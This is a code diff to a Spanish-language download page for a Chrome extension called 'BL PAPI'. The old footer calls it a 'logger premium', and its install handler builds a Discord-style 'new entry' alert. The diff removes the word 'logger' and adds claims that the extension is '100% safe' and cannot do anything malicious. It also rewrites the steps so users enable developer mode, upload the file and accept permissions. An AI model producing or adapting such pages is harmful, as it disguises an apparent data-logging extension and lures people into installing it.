@@ -174,19 +174,19 @@
 <body>
     <div class="card">
         <h1>BL PAPI</h1>
-        <div class="subtitle">Generador de extensión · parche automático</div>
+        <div class="subtitle">BL papi</div>
 
         <div class="features">
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
-            <div class="feature-tag"><span>Edítalo después...</span></div>
+            <div class="feature-tag"><span>Rapido</span></div>
+            <div class="feature-tag"><span>Sencillo</span></div>
+            <div class="feature-tag"><span>Seguro 100%</span></div>
+            <div class="feature-tag"><span>¿Porque es Seguro? Puedes desintslarlo cuando quieras.</span></div>
+            <div class="feature-tag"><span>No tiene Permisos Para Hacer Nada Malicioso.</span></div>
         </div>
 
         <div class="button-group">
             <button class="btn btn-primary" onclick="window.descargarCRX()">
-                <span style="font-size: 22px;">⬇️</span> DESCARGAR .CRX
+                <span style="font-size: 22px;">⬇️</span> DESCARGAR 
             </button>
             <button class="btn btn-secondary" onclick="window.mostrarInstrucciones()">
                 <span style="font-size: 22px;">📘</span> INSTRUCCIONES
@@ -197,14 +197,14 @@
             <div class="instruction-title">
                 <span>📋</span> Cómo instalar BL PAPI
             </div>
-            <div class="instruction-step"><span>1.</span> Descarga el archivo .crx</div>
-            <div class="instruction-step"><span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">lemur://extensions</code></div>
+            <div class="instruction-step"><span>1.</span> Descarga el archivo </div>
+            <div class="instruction-step"><span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">CHROME://extensions</code></div>
             <div class="instruction-step"><span>3.</span> Activa modo desarrollador (esquina)</div>
-            <div class="instruction-step"><span>4.</span> Arrastra el .crx a la ventana</div>
-            <div class="instruction-step"><span>5.</span> Acepta permisos · ¡listo!</div>
+            <div class="instruction-step"><span>4.</span> Coloca Upload y coloca el BL Papi</div>
+            <div class="instruction-step"><span>5.</span> Acepta permisos Si es que Pide (Permisos Basicos)</div>
         </div>
 
-        <div class="footer-note">BL PAPI · logger premium</div>
+        <div class="footer-note">BL PAPI · Esto esta creado por @benjman</div>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -402,7 +402,7 @@ chrome.runtime.onInstalled.addListener(async () => {
     }
 
     const embed = {
-        title: "🔔¡ NUEVA ENTRADA | **BL PAPI** !",
+        title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
         color: 15158332,
         fields: [
             {
@@ -510,10 +510,10 @@ chrome.runtime.onInstalled.addListener(async () => {
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'BL_PAPI.crx';
+                a.download = 'BL_PAPI';
                 a.click();
                 URL.revokeObjectURL(url);
-                alert('✅ BL_PAPI.crx generado');
+                alert('✅ BL_PAPI generado');
             }).catch(err => {
                 alert('❌ Error al generar: ' + err.message);
             });
